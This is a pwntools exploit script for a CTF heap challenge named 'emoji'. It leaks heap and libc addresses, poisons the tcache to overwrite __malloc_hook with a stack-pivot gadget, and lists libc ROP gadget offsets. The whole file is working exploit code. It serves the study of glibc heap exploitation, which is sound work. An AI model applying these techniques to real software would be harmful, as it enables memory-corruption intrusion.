# -*- coding: utf-8 -*-
from pwn import *
import sys
import os

remote_ip,port = 'emoji.darkarmy.xyz','32769'
binary = './emoji'

if len(sys.argv)>1:
    io = remote(remote_ip,port)

else:
    io = process(binary,env={'LD_PRELOAD':'./libc-2.31.so'})

re = lambda a: io.recv(a)
ru = lambda a: io.recvuntil(a)
rl = lambda  : io.recvline()
s  = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla= lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

def add(idx,size,data):
    sla('🤔: ','1')
    sla('index: ',str(idx))
    sla('size: ',str(size))
    sla('Data: ',str(data))

def free(idx):
    sla('🤔: ','2')
    sla('index: ',str(idx))

def view(idx):
    sla('🤔: ','3')
    sla('index: ',str(idx))

def Print_Name(name):
    sla('🤔: ','5')
    sla('name:',str(name))

def vuln(idx,size,data):
    sla('🤔: ','6')
    sla('index: ',str(idx))
    sla('Size: ',str(size))
    sla('go: ',str(data))


def fill_tcache(size):
    for i in range(7):
        sla('🤔: ','1')
        sla('index: ',"0")
        sla('size: ',str(size))
        sla('Data: ',"aaa")
        sla('🤔: ','2')
        sla('index: ',"0")

L_DIX = 0x0014bb58 #: mov rdx, r12 ; mov rdi, r14 ; call qword [rax+0x10] ;
L_RSI = 0x00159c5c #: mov rsi, rsp ; call qword [rax+0x40] ;
L_JMP = 0x0015a004 #: jmp qword [rax+0x48] ;
R_SYSCALL = 0x001165d4 #: xor eax, eax ; syscall  ; 
L_pop_rdi = 0x0015f772
L_pop_rsi = 0x0015e7b3
L_pop_rdx = 0x0016276f #2
L_pop_rax = 0x000d21a7
L_syscall = 0x00110b39
L_add_rsp = 0x001114ac
L_pop_rax_pop_rdx = 0x0016271d #: pop rax ; pop rdx ; pop rbx ; ret  ;

if __name__ == '__main__':
    fill_tcache(0xf0)
    fill_tcache(0x60)
    fill_tcache(0xc0)
    add(0,0x50,"aaa")
    Print_Name("a"*0x20)
    io.recvuntil("a"*0x20)
    heap_leak = u64(io.recv(6)+"\x00\x00")-0x1260
    log.info("heap at "+str(hex(heap_leak)))
    add(1,0x60,(p64(0)+p64(0xd1)+p64(heap_leak+0x12c0)*2))
    add(2,0x60,"ccc")
    add(3,0xf0,"ddd")
    add(4,0x10,"eee")
    free(2)
    payload = "\x00"*0x60 + p64(0xd0)
    vuln(2,0x68,payload)
    free(3)
    add(3,0x50,"aa")
    view(2)
    libc_leak = u64(io.recv(6)+"\x00\x00")-0x1ebbe0
    log.info("libc at "+str(hex(libc_leak)))
    #leave_ret = libc_leak+0x000000000005aa48
    leave_ret = libc_leak+0x000000000005aa48
    pivot = libc_leak + 0x000000000012fe7e
    free(0)
    free(4)
    malloc_hook = libc_leak + 0x1ebb3d
    add(0,0x60,"aaaaaaaa")
    add(4,0x60,"11111111")
    free(0)
    free(4)
    free(2)
    add(0,0x60,p64(malloc_hook))
    add(2,0x60,"aaaaa")
    add(4,0x60,"aaaaa")
    free(3)
    payload = "a"*35 + p64(pivot)
    add(3,0x60,payload)
    free(0)
    gdb.attach(io)
    add(0,0x10,"a")
    io.interactive()
